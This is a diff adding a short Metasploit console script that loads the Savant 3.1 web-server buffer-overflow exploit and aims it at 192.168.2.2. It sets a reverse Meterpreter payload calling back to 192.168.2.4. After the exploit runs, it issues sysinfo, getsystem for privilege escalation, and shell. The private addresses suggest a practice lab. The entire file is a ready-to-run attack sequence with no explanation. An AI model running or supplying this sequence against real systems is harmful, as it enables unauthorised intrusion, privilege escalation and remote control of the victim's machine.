@@ -1,0 +1,15 @@
+search savant
+use 1
+
+use exploit/windows/http/savant_31_overflow
+
+set RHOSTS 192.168.2.2
+set LHOST 192.168.2.4
+
+set payload windows/meterpreter/reverse_ord_tcp
+
+run
+
+sysinfo
+getsystem
+shell
